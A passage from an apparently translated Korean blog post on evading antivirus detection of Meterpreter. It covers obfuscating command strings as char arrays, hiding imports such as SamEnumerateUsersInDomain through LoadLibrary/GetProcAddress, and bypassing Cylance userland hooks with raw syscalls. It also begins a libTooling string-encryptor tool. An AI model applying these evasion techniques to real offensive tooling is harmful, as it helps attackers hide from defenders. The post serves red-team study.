class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-숨기기"><a href="#API-Import-숨기기" class="headerlink" title="API Import 숨기기"></a>API Import 숨기기</h2><p>외부 라이브러리에서 export 된 함수를 호출하면 linker가 <em>Import Address Table</em>(IAT)에 기록한다. 함수 이름은 바이너리에서 평문으로 볼 수 있고 실행하지 않고 정적으로 확인할 수 있다. 의심스러운 함수명들을 숨기고 정상적인 바이너리에 존재하는 것들은 유지하는 것이 좋다.</p><p>Meterpreter의 <em>kiwi</em> extension에서 다음과 같은 코드를 찾을 수 있다.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>이 함수는 <code>samlib.dll</code>에서 export 되므로 컴파일된 바이너리에는 <code>samlib.dll</code>과 <code>SamEnumberateUsersInDomain</code> 문자열이 표시된다.</p><p>이를 해결하기 위해 실행 중에 <code>LoadLibrary/GetProcAddress</code>를 사용하여 API를 가져올 수 있다. 이 함수들은 문자열을 인자로 사용하므로 난독화를 잘해야 한다. 따라서 위의 코드를 다음과 같이 재작성해야 한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-재작성"><a href="#syscall-재작성" class="headerlink" title="syscall 재작성"></a>syscall 재작성</h2><p>Cylance가 실행 중인 컴퓨터에서 Meterpreter의 <em>migrate</em>를 사용하면 안티바이러스 탐지가 실행된다. Cylance는 userland hook으로 프로세스 인젝션을 탐지한다. 탐지를 우회하려면 hook을 제거하는 것으로 간단히 우회할 수 있다. ntdll을 읽은 후 syscall 번호를 복구하고 ready-to-call shellcode에 삽입하는 것은 간단하고 userland hook을 효과적으로 우회한다. 필자는 지금까지 NTDLL.DLL을 악성 파일로 판단하는 것을 보지 못했다.</p><h1 id="구현"><a href="#구현" class="headerlink" title="구현"></a>구현</h1><p>앞서 말한 모든 아이디어들은 <em>libTooling</em>을 기반으로 한 source code refactoring tool에서 구현할 수 있다. 이 부분은 <em>libTooling</em> 문서가 부족해서 필자의 팀에서 가능한 시간 동안 한 것을 문서화했다. 따라서 개선의 여지가 있으며 무언가 눈에 띄는 경우 필자는 그것에 대해 듣고 싶다.</p><h2 id="추상-구문-트리-101"><a href="#추상-구문-트리-101" class="headerlink" title="추상 구문 트리 101"></a>추상 구문 트리 101</h2><p>컴파일러는 보통 여러 구성 요소로 구성되는데 일반적으로 <em>Parser</em>와 <em>Lexer</em>로 구성된다. 소스 코드가 컴파일러에 들어가면 먼저 프로그래머가 작성한 원본 소스 코드에서 Parse Tree를 생성하고 컴파일러가 필요로 하는 노드에 semantic information을 추가한다. 이 결과를 <em>Abstract Syntax Tree</em>(추상 구문 트리)라고 부른다. 다음은 위키피디아의 예시이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b ≠ <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a − b  <span class="hljs-keyword">else</span>    b := b − a<span class="hljs-keyword">return</span> a</code></pre><p>간단한 프로그램의 일반적인 AST는 다음과 같다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">추상 구문 트리 예시</a></p><p>이 데이터 구조는 다른 프로그램의 property를 이해하는 프로그램을 작성할 때 정밀한 알고리즘을 제공하므로 대규모 코드 refactoring에 적합하다.</p><h3 id="Clang’s-Abstract-Syntax-Tree"><a href="#Clang’s-Abstract-Syntax-Tree" class="headerlink" title="Clang’s Abstract Syntax Tree"></a>Clang’s Abstract Syntax Tree</h3><p>The Right Way의 소스 코드를 변경해야 하므로 Clang의 AST에 대해 알아야 한다. Clagn은 AST 덤프를 command-line switch에 예쁘게 표시하지만 컴파일러 플래그 설정이 까다롭다.</p><p>간단한 테스트 translation unit을 만들어보자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 다음 스크립트를 <code>.sh</code> 파일에 작성해라</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>는 Win32 API와 interact 하기 위해 필요한 헤더들이 있는 폴더이다. 윈도우10에서 가져왔으며 MinGW에서 가져오지 말고 필자와 같은 방법으로 하는 것을 추천한다. 그 후 테스트 C 파일을 인자로 스크립트를 실행하면 18MB 파일이 생성되지만 <code>NtMapViewOfSection</code> 같은 우리가 선언한 문자열 리터럴을 검색해서 AST에서 봐야 할 부분으로 이동할 수 있다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>AST를 시각화했으므로 어떻게 노드를 업데이트해야 소스 코드의 syntax 오류가 없을지 알 수 있다. 뒷부분은 <em>libTooling</em>을 통한 AST manipulation 구현에 대해서 상세히 다룬다.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>구현을 하기 전에 boilerplate 코드가 필요하므로 다음 코드를 <code>main.cpp</code>에 입력해라.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file 